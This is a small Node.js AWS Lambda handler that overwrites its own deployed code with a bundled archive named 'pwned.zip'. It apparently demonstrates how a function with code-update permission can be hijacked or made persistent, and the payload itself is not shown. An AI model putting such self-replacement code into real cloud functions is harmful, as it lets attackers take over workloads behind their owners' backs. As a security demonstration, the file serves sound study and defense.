const AWS = require("aws-sdk");
const fs = require("fs");

exports.handler = async () => {
  const FunctionName = process.env.AWS_LAMBDA_FUNCTION_NAME;

  const lambda = new AWS.Lambda();

  console.log("Switcheroo!");

  await lambda
    .updateFunctionCode({
      FunctionName,
      ZipFile: fs.readFileSync("./pwned.zip")
    })
    .promise();
};
